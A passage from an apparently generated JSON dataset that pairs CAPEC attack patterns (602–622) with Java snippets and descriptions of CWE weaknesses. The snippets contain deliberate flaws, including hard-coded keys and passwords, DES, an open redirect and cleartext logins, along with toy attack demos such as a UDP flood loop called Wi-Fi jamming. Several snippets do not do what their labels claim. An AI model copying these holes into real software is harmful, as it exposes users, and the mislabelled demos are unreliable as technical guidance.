        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // Use of obsolete function (CWE-477)\n            Class.forName(\"com.mysql.jdbc.Driver\");\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(\"SELECT * FROM users\");\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\"));\n            }\n\n            // Deprecated method for closing connection\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of an obsolete function, which is a common issue described in CWE-477. The code uses the deprecated 'com.mysql.jdbc.Driver' for establishing a database connection, which suggests that the code has not been actively reviewed or maintained. This can lead to potential security vulnerabilities and compatibility issues. The main idea represented here is the degradation of code quality and security due to the use of outdated and deprecated functions."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ResourceBlockage {\n    private static final int MAX_RESOURCES = 1000;\n    private List<Object> resources = new ArrayList<>();\n\n    public void allocateResource() {\n        // CWE-770: No limit on resource allocation\n        while (true) {\n            resources.add(new Object());\n            // CWE-400: Uncontrolled resource consumption\n            if (resources.size() > MAX_RESOURCES) {\n                System.out.println(\"Resource limit exceeded, system may fail.\");\n                break;\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ResourceBlockage rb = new ResourceBlockage();\n        rb.allocateResource();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can block the delivery of an important system resource, causing the system to fail or stop working. The `allocateResource` method continuously allocates resources without proper limits (CWE-770), leading to uncontrolled resource consumption (CWE-400). When the number of allocated resources exceeds a predefined limit (MAX_RESOURCES), the system prints a warning message and breaks the loop, indicating a potential system failure due to resource exhaustion. This embodies the main idea of the CAPEC 'Blockage' by showing how improper resource management can lead to system failure."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiJamming {\n    public static void main(String[] args) throws IOException {\n        // Target Wi-Fi Access Point IP and Port\n        String targetIP = \"192.168.1.1\";\n        int targetPort = 8080;\n        \n        // Create a socket to send deauthentication frames\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n        \n        // Deauthentication frame payload (simplified for demonstration)\n        byte[] deauthFrame = new byte[1024];\n        \n        // Continuously send deauthentication frames to the target\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(deauthFrame, deauthFrame.length, targetAddress, targetPort);\n            socket.send(packet);\n            System.out.println(\"Deauthentication frame sent to \" + targetIP);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of Wi-Fi jamming by continuously sending deauthentication frames to a target Wi-Fi access point. The code creates a UDP socket and sends packets to the specified IP address and port of the target access point. This simulates the attack scenario where an attacker floods the access point with deauthentication frames, disrupting the communication channel. The code embodies the main idea of the CAPEC by actively transmitting on the Wi-Fi channel to prevent users from transmitting or receiving data. The related CWEs are represented by the lack of message integrity verification (CWE-924), improper endpoint restriction (CWE-923), and cleartext transmission (CWE-319), which are common weaknesses that can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class CellularJammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target cell tower IP\n        byte[] buffer = new byte[1024];\n        String message = \"Jamming Signal\";\n        buffer = message.getBytes();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 12345);\n        socket.send(packet);\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // The cell tower does not verify the source or integrity of the message\n        System.out.println(\"Jamming signal sent to disrupt communication.\");\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a cellular jamming attack. The code creates a DatagramSocket to send a UDP packet containing a 'Jamming Signal' message to a target cell tower. The message is sent in cleartext (CWE-319), and the cell tower does not verify the source or integrity of the message (CWE-300, CWE-940, CWE-924). This can disrupt the communication between a cellular user device and the cell tower, embodying the main idea of the Cellular Jamming CAPEC."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class CellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // Simulate negotiation of encryption algorithm\n        String[] algorithms = {\"AES\", \"DES\", \"Blowfish\"};\n        String selectedAlgorithm = negotiateAlgorithm(algorithms);\n\n        // Generate key\n        SecretKey key = generateKey(selectedAlgorithm);\n\n        // Initialize cipher with selected algorithm\n        Cipher cipher = Cipher.getInstance(selectedAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Encrypt data\n        String data = \"Sensitive Data\";\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static String negotiateAlgorithm(String[] algorithms) {\n        // Simulate a downgrade attack by selecting a weaker algorithm\n        return algorithms[1]; // Selects DES instead of AES\n    }\n\n    private static SecretKey generateKey(String algorithm) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(new SecureRandom());\n        return keyGen.generateKey();\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a cellular device negotiates an encryption algorithm with a base station. The `negotiateAlgorithm` method represents a vulnerability where a weaker algorithm (DES) is selected instead of a stronger one (AES), embodying CWE-757 (Algorithm Downgrade). The code then generates a cryptographic key and initializes a cipher with the selected algorithm. This demonstrates the potential for using inadequate encryption strength (CWE-326) and risky cryptographic algorithms (CWE-327). The main idea of the CAPEC is represented by showing how an attacker could force the use of a less secure encryption method, compromising the security of the transmitted data."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ObstructionExample {\n    private Lock lock = new ReentrantLock();\n    private boolean isProtected = false;\n\n    public void performCriticalOperation() {\n        if (!isProtected) {\n            System.out.println(\"Protection mechanism is not enabled!\");\n            return;\n        }\n\n        lock.lock();\n        try {\n            // Simulate critical operation\n            System.out.println(\"Performing critical operation...\");\n            // Simulate obstruction by an attacker\n            if (Math.random() > 0.5) {\n                throw new RuntimeException(\"Obstruction occurred!\");\n            }\n            System.out.println(\"Critical operation completed successfully.\");\n        } catch (RuntimeException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public void enableProtection() {\n        isProtected = true;\n    }\n\n    public static void main(String[] args) {\n        ObstructionExample example = new ObstructionExample();\n        example.performCriticalOperation(); // Attempt without protection\n        example.enableProtection();\n        example.performCriticalOperation(); // Attempt with protection\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can obstruct the interactions between system components, leading to a degraded state or failure. The `performCriticalOperation` method simulates a critical operation that requires protection. If the protection mechanism (`isProtected`) is not enabled, the operation is aborted. The method uses a lock to simulate proper isolation and compartmentalization. However, an attacker can still cause an obstruction by throwing a runtime exception, representing an error injection or fault. The `enableProtection` method is used to enable the protection mechanism, demonstrating the importance of proper protection mechanisms to prevent such obstructions."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class CellularEncryption {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final String HARD_CODED_KEY = \"0123456789abcdef\"; // 128-bit key\n\n    public static void main(String[] args) throws Exception {\n        String plaintext = \"Sensitive data\";\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm (DES)\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        SecretKeySpec keySpec = new SecretKeySpec(HARD_CODED_KEY.getBytes(), \"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n        String encryptedText = Base64.getEncoder().encodeToString(encrypted);\n        System.out.println(\"Encrypted Text: \" + encryptedText);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        // Simulating a downgrade attack by forcing the use of DES instead of a stronger algorithm\n        cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.DECRYPT_MODE, keySpec);\n        byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(encryptedText));\n        String decryptedText = new String(decrypted);\n        System.out.println(\"Decrypted Text: \" + decryptedText);\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerabilities described in the CAPEC and related CWEs. The code uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (DES, CWE-327) to encrypt and decrypt sensitive data. Additionally, it simulates an algorithm downgrade attack (CWE-757) by forcing the use of DES instead of a stronger algorithm. This represents the main idea of the CAPEC, which involves using cryptanalytic techniques to defeat weak cellular encryption and reveal traffic content."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            String sensitiveData = \"username=admin&password=admin123\";\n            URL url = new URL(\"http://example.com/login\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            OutputStream os = connection.getOutputStream();\n            os.write(sensitiveData.getBytes());\n            os.flush();\n            os.close();\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where sensitive data (username and password) is transmitted in cleartext over HTTP. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by showing how sensitive information can be intercepted if not properly encrypted. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) by sending sensitive data without encryption, making it susceptible to interception by malicious actors. The code does not verify the source of the communication channel (CWE-940) and does not ensure message integrity (CWE-924), further increasing the risk of interception and tampering."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CellularDataInjection {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\"; // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String message = \"NormalMessage\";\n        String injectedMessage = message + sensitiveData; // CWE-924: Improper Enforcement of Message Integrity During Transmission\n\n        try (Socket socket = new Socket(\"example.com\", 80);\n             OutputStream outputStream = socket.getOutputStream()) {\n            outputStream.write(injectedMessage.getBytes()); // CWE-319: Cleartext Transmission of Sensitive Information\n            outputStream.flush();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of cellular data injection, where an adversary injects sensitive data into a normal message being transmitted over a network. The code combines a normal message with sensitive information (CWE-201) and sends it over a network connection without ensuring message integrity (CWE-924) or encrypting the data (CWE-319). This can be exploited to disrupt communications or conduct surveillance operations, aligning with the main idea of the CAPEC. The code also implicitly suggests the potential for network amplification (CWE-406) by not controlling the volume of transmitted data."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"https://trusted-domain.com\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential vulnerability related to BitSquatting and several CWEs. The servlet takes a 'url' parameter from the HTTP GET request and redirects the user to that URL. This can be exploited if an attacker registers a domain name that is one bit different from a trusted domain (BitSquatting). The code does not validate the 'url' parameter, leading to CWE-601 (Open Redirect). Additionally, using the GET method to pass the 'url' parameter can expose sensitive information (CWE-598). This code snippet highlights the risks of improper handling of user-controlled inputs in web applications, which can be exploited for phishing and other malicious activities."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiMACAddressTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            String macAddress = extractMACAddress(receivedData);\n            if (macAddress != null) {\n                System.out.println(\"Tracked MAC Address: \" + macAddress);\n            }\n        }\n    }\n\n    private static String extractMACAddress(String data) {\n        // Simplified extraction logic for demonstration purposes\n        if (data.contains(\"MAC:\")) {\n            return data.substring(data.indexOf(\"MAC:\") + 4, data.indexOf(\"MAC:\") + 21);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a WiFi MAC address tracker. The program listens for incoming UDP packets on port 9999, extracts the MAC address from the received data, and prints it to the console. This embodies the main idea of the CAPEC by showing how an attacker could passively listen for WiFi messages and log MAC addresses. The code also touches on related CWEs: it transmits sensitive information (CWE-201), does not verify the identity of actors (CWE-300), and opens a channel that could be accessed by unauthorized actors (CWE-421)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiSSIDTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            if (receivedData.contains(\"SSID\")) {\n                System.out.println(\"Captured SSID: \" + receivedData);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple WiFi SSID tracker. It listens for incoming UDP packets on port 9999, which is a common port for network traffic. When a packet is received, it checks if the packet contains the string 'SSID'. If it does, it prints the captured SSID to the console. This code embodies the main idea of the CAPEC 'WiFi SSID Tracking' by passively listening for WiFi management frames that contain SSIDs. The related CWEs are represented as follows:\n- CWE-201: The code captures and prints sensitive information (SSID) that should not be accessible to unauthorized actors.\n- CWE-300: The code does not verify the identity of the sender, allowing any actor to send data to the socket.\n- CWE-1290, CWE-1192, CWE-1302: These are not directly represented in the code but highlight potential issues in a more complex implementation, such as incorrect decoding of security identifiers or missing source identifiers in transactions."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class SimCardAttack {\n    private static final String DES_ALGORITHM = \"DES\";\n    private static final String DES_KEY = \"12345678\"; // Weak DES key\n\n    public static void main(String[] args) {\n        try {\n            String payload = \"Malicious Java Applet\";\n            String encryptedPayload = encryptPayload(payload, DES_KEY);\n            sendOTAMessage(encryptedPayload);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String encryptPayload(String payload, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(DES_ALGORITHM);\n        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), DES_ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encryptedBytes = cipher.doFinal(payload.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n\n    private static void sendOTAMessage(String encryptedPayload) {\n        // Simulate sending an OTA message\n        System.out.println(\"Sending OTA message: \" + encryptedPayload);\n        // In a real scenario, this would send the message to the SIM card\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key to encrypt a payload, which represents a malicious Java applet. The encrypted payload is then sent as an OTA (Over-The-Air) message to the SIM card. The use of a weak DES key (CWE-327) and inadequate encryption strength (CWE-326) makes it possible for an attacker to crack the key and send properly signed binary SMS messages to the device. This code highlights the vulnerability of using broken or risky cryptographic algorithms in securing sensitive operations."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableWiFiClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            String payload = \"username=admin&password=admin\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Wi-Fi client that connects to a server over HTTP, transmitting sensitive information (username and password) in cleartext (CWE-319). The code does not verify the identity of the server (CWE-923, CWE-940), nor does it ensure the integrity of the communication channel (CWE-924). This makes it susceptible to an Evil Twin Wi-Fi Attack, where an adversary sets up a rogue Wi-Fi access point to intercept and capture the transmitted data. The code represents the main idea of the CAPEC by showing how sensitive information can be exposed due to improper security measures in the communication channel."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import java.io.*;\n\npublic class RogueLocationExample {\n    public static void main(String[] args) {\n        String filePath = \"/trusted/path/config.txt\";\n        String untrustedPath = \"/untrusted/path/config.txt\";\n\n        // CWE-426: Untrusted Search Path\n        File file = new File(untrustedPath);\n        if (!file.exists()) {\n            file = new File(filePath);\n        }\n\n        try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application searches for a configuration file in an untrusted location before falling back to a trusted location. The code first attempts to read the configuration file from an untrusted path (`/untrusted/path/config.txt`). If the file does not exist in the untrusted path, it then attempts to read from the trusted path (`/trusted/path/config.txt`). This behavior embodies the CAPEC 'Establish Rogue Location' by allowing an adversary to place a malicious file in the untrusted path, which the application will read if it exists. This can lead to various security issues, such as exposure of sensitive information (CWE-200), improper verification of the source (CWE-940), and resource leaks (CWE-402)."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import java.net.Socket;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class RogueBaseStation {\n    private static final String TRUSTED_BASE_STATION_IP = \"192.168.1.1\";\n    private static final int BASE_STATION_PORT = 12345;\n\n    public static void main(String[] args) {\n        try {\n            // Connect to the base station\n            Socket socket = new Socket(TRUSTED_BASE_STATION_IP, BASE_STATION_PORT);\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n\n            // Simulate communication with the base station\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n            while (bytesRead != -1) {\n                // Process the received data\n                String receivedData = new String(buffer, 0, bytesRead);\n                System.out.println(\"Received: \" + receivedData);\n\n                // Respond to the base station\n                String responseData = \"ACK\";\n                output.write(responseData.getBytes());\n\n                // Read the next chunk of data\n                bytesRead = input.read(buffer);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where a device connects to a base station and communicates with it. The code does not verify the authenticity of the base station, making it vulnerable to a 'Cellular Rogue Base Station' attack. An attacker could set up a rogue base station with a stronger signal, causing the device to connect to it instead of the trusted base station. The code also lacks proper message integrity checks and endpoint verification, which are critical weaknesses (CWE-940, CWE-300, CWE-924, CWE-923) that could be exploited by an attacker to intercept or manipulate the communication."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class CellularBroadcastAttack {\n    private static final String TARGET_PHONE_NUMBER = \"1234567890\";\n    private static final String BROADCAST_URL = \"http://example.com/sendBroadcast\";\n\n    public static void main(String[] args) {\n        try {\n            // Create URL connection\n            URL url = new URL(BROADCAST_URL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // Send target phone number in the request\n            String requestBody = \"phoneNumber=\" + TARGET_PHONE_NUMBER;\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(requestBody.getBytes());\n                os.flush();\n            }\n\n            // Check response to verify if the target is in the location\n            try (InputStream is = conn.getInputStream()) {\n                byte[] response = new byte[1024];\n                int bytesRead = is.read(response);\n                String responseStr = new String(response, 0, bytesRead);\n                if (responseStr.contains(\"Broadcast Sent\")) {\n                    System.out.println(\"Target is in the location area.\");\n                } else {\n                    System.out.println(\"Target is not in the location area.\");\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a 'Cellular Broadcast Message Request' attack. The attacker sends a request to a hypothetical broadcast service with the target's phone number. The service then sends a broadcast message to the target's location area. By analyzing the response, the attacker can determine if the target is in the specified location area. The code embodies several weaknesses: it transmits sensitive information (the target's phone number) without proper verification (CWE-201), does not ensure message integrity (CWE-924), and does not verify the source of the communication (CWE-940). This example highlights how an attacker could exploit these weaknesses to track a target's location."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class SignalStrengthTracker {\n    private static final int PORT = 9876;\n    private static final String TARGET_MAC = \"00:14:22:01:23:45\";\n\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(PORT);\n        byte[] receiveData = new byte[1024];\n\n        while (true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            String receivedMessage = new String(receivePacket.getData(), 0, receivePacket.getLength());\n\n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            if (receivedMessage.contains(TARGET_MAC)) {\n                InetAddress IPAddress = receivePacket.getAddress();\n                int port = receivePacket.getPort();\n                String response = \"Tracking signal strength for MAC: \" + TARGET_MAC;\n                DatagramPacket sendPacket = new DatagramPacket(response.getBytes(), response.length(), IPAddress, port);\n                socket.send(sendPacket);\n            }\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (!verifySource(receivePacket.getAddress())) {\n                System.out.println(\"Warning: Unverified source\");\n                continue;\n            }\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            if (!verifyMessageIntegrity(receivedMessage)) {\n                System.out.println(\"Warning: Message integrity compromised\");\n                continue;\n            }\n        }\n    }\n\n    private static boolean verifySource(InetAddress address) {\n        // Dummy verification for example purposes\n        return address.getHostAddress().startsWith(\"192.168.\");\n    }\n\n    private static boolean verifyMessageIntegrity(String message) {\n        // Dummy integrity check for example purposes\n        return message.length() > 0;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a signal strength tracking system. The code listens for incoming UDP packets and checks if the message contains a specific MAC address (CWE-201: Insertion of Sensitive Information Into Sent Data). If the MAC address is found, it sends a response back to the sender, potentially exposing sensitive information. The code also includes basic checks for verifying the source of the communication (CWE-940: Improper Verification of Source of a Communication Channel) and ensuring message integrity (CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel). These checks are rudimentary and serve to illustrate the potential vulnerabilities in such a system."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class EncryptionExample {\n    public static void main(String[] args) throws Exception {\n        // Hard-coded key (CWE-321)\n        String hardCodedKey = \"1234567890123456\";\n        SecretKey secretKey = new SecretKeySpec(hardCodedKey.getBytes(), \"AES\");\n\n        // Encrypt data with a weak algorithm (CWE-326)\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        String sensitiveData = \"Sensitive Information\";\n        byte[] encryptedData = cipher.doFinal(sensitiveData.getBytes());\n        String encryptedString = Base64.getEncoder().encodeToString(encryptedData);\n        System.out.println(\"Encrypted Data: \" + encryptedString);\n\n        // Simulate a downgrade attack by switching to a weaker algorithm (CWE-757)\n        Cipher weakCipher = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n        SecretKey weakKey = keyGen.generateKey();\n        weakCipher.init(Cipher.ENCRYPT_MODE, weakKey);\n        byte[] weakEncryptedData = weakCipher.doFinal(sensitiveData.getBytes());\n        String weakEncryptedString = Base64.getEncoder().encodeToString(weakEncryptedData);\n        System.out.println(\"Weakly Encrypted Data: \" + weakEncryptedString);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where encryption is applied to sensitive data, but with significant vulnerabilities. Initially, it uses a hard-coded cryptographic key (CWE-321) and a weak encryption algorithm (AES with ECB mode, CWE-326). The code then simulates a downgrade attack (CWE-757) by switching to an even weaker algorithm (DES). This represents the CAPEC 'Drop Encryption Level' where an attacker forces the encryption level to be lowered, making the encrypted data more susceptible to attacks. The code highlights the risks associated with using inadequate encryption strength and hard-coded keys."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class VulnerableVoIPClient {\n    public static void main(String[] args) {\n        String serverAddress = \"192.168.1.100\";\n        int port = 5000;\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream()) {\n            Random random = new Random();\n            while (true) {\n                // Simulate sending VoIP packets with varying sizes and timing\n                int packetSize = random.nextInt(200) + 50; // Packet size between 50 and 250 bytes\n                byte[] packet = new byte[packetSize];\n                random.nextBytes(packet);\n                out.write(packet);\n                out.flush();\n                // Simulate timing between packets\n                Thread.sleep(random.nextInt(100)); // Sleep between 0 and 100 ms\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates a vulnerable VoIP client that sends packets of varying sizes and timing to a server. The main idea is to demonstrate how an attacker could analyze packet timing and sizes to infer information, even if the data is encrypted. The code generates random packet sizes and sends them at random intervals, which could be observed by an attacker to gather metadata. This embodies the CAPEC 'Analysis of Packet Timing and Sizes' and relates to CWEs such as 'Observable Timing Discrepancy' (CWE-208) and 'Covert Timing Channel' (CWE-385)."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.util.Base64;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Generate a secret key\n        SecretKey secretKey = generateKey();\n\n        // Encrypt sensitive data\n        String sensitiveData = \"Sensitive Information\";\n        String encryptedData = encryptData(sensitiveData, secretKey);\n\n        // Print encrypted data\n        System.out.println(\"Encrypted Data: \" + encryptedData);\n    }\n\n    private static SecretKey generateKey() throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\"); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        return keyGen.generateKey();\n    }\n\n    private static String encryptData(String data, SecretKey key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
